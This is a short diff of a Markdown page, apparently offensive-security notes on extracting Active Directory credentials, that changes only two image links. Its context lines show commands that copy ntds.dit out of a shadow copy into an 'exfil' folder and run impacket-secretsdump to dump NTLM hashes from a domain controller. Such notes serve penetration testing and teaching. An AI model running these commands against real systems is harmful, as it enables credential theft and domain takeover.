@@ -58,7 +58,7 @@ cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
 
 Below shows the ntds.dit got etracted and placed into our c:\exfil folder:
 
-![](../../.gitbook/assets/image%20%28392%29.png)
+![](../../.gitbook/assets/image%20%28391%29.png)
 
 Inside interactive diskshadow utility, clean up the shadow volume:
 
@@ -76,7 +76,7 @@ If you have credentials for an account that can log on to the DC, it's possible 
 impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
 ```
 
-![](../../.gitbook/assets/image%20%28177%29.png)
+![](../../.gitbook/assets/image%20%28176%29.png)
 
 ## References
 
